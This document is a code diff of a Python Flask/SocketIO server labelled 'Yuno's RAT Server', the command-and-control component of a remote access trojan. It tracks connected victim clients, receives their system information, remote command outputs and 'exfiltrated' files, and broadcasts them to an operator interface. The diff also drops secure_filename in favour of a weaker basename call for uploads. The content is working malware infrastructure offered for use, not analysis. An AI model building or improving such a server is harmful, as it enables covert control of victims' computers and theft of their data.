@@ -4,7 +4,6 @@ import json
 import datetime
 from flask import Flask, render_template, request, send_from_directory, jsonify
 from flask_socketio import SocketIO, emit
-from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
@@ -18,10 +17,10 @@ for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
         os.makedirs(folder)
 
 # In-memory storage
-connected_clients = set()  # Track connected client IDs
-client_info = {}  # Store client system info {client_id: system_info}
-command_outputs = []  # Store command outputs [{client_id, command, output, current_dir, timestamp}]
-exfiltrated_files = []  # Store exfiltrated files [{client_id, filename, content, timestamp}]
+connected_clients = set()
+client_info = {}
+command_outputs = []
+exfiltrated_files = []
 
 @app.route('/')
 def index():
@@ -50,7 +49,7 @@ def upload_file():
     if file.filename == '':
         return jsonify({"status": "error", "message": "No selected file"}), 400
     if file:
-        filename = secure_filename(file.filename)
+        filename = os.path.basename(file.filename)  # Simplified to avoid secure_filename import issue
         file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
         file.save(file_path)
         return jsonify({"status": "success", "filename": filename})
@@ -84,41 +83,30 @@ def handle_disconnect():
 def handle_exfil_data(sid, data):
     """Handle exfiltrated data from clients."""
     client_id = request.sid
-    print(f"[*] Received exfil_data from {client_id}: {data}")
+    print(f"[DEBUG] Exfil_data received - sid: {sid}, data: {data}")
     try:
-        data = json.loads(data) if isinstance(data, str) else data
+        parsed_data = json.loads(data) if isinstance(data, str) else data
+        print(f"[DEBUG] Parsed data: {parsed_data}")
     except json.JSONDecodeError as e:
-        print(f"[!] JSON decode error for exfil_data from {client_id}: {e}")
+        print(f"[!] JSON decode error for {client_id}: {e}")
         return
 
-    data_type = data.get('type')
+    data_type = parsed_data.get('type')
     timestamp = datetime.datetime.now()
 
     if data_type == "system_info":
-        system_info = data.get('system', {})
-        client_info[client_id] = system_info
+        client_info[client_id] = parsed_data.get('system', {})
         filename = f"{client_id}_{timestamp.strftime('%Y%m%d_%H%M%S')}_sysinfo.json"
-        content = json.dumps(data, indent=4)
-        exfiltrated_files.append({
-            'client_id': client_id,
-            'filename': filename,
-            'content': content,
-            'timestamp': timestamp
-        })
-        print(f"[*] Exfiltrated system info stored in memory: {filename}")
+        content = json.dumps(parsed_data, indent=4)
+        exfiltrated_files.append({'client_id': client_id, 'filename': filename, 'content': content, 'timestamp': timestamp})
+        print(f"[*] Exfiltrated system info stored: {filename}")
         emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)
 
     elif data_type == "command_output":
-        command = data.get('command', 'unknown')
-        output = data.get('output', '')
-        current_dir = data.get('current_dir', 'unknown')
-        command_outputs.append({
-            'client_id': client_id,
-            'command': command,
-            'output': output,
-            'current_dir': current_dir,
-            'timestamp': timestamp
-        })
+        command = parsed_data.get('command', 'unknown')
+        output = parsed_data.get('output', '')
+        current_dir = parsed_data.get('current_dir', 'unknown')
+        command_outputs.append({'client_id': client_id, 'command': command, 'output': output, 'current_dir': current_dir, 'timestamp': timestamp})
         print(f"[*] Command output received: {command} -> {output}")
         emit('command_output', {
             'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
@@ -128,21 +116,15 @@ def handle_exfil_data(sid, data):
             'current_dir': current_dir
         }, broadcast=True)
 
-    client_info_list = [
-        {'id': cid, 'system': info}
-        for cid, info in client_info.items()
-    ]
+    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
     emit('client_info', client_info_list, broadcast=True)
 
 @socketio.on('request_client_info')
 def handle_request_client_info(sid):
     """Handle requests for client info from the web interface."""
-    print(f"[*] Handling request_client_info from {sid}")
-    client_info_list = [
-        {'id': cid, 'system': info}
-        for cid, info in client_info.items()
-    ]
-    emit('client_info', client_info_list)
+    print(f"[DEBUG] Request_client_info received - sid: {sid}")
+    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
+    emit('client_info', client_info_list, broadcast=True)
 
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
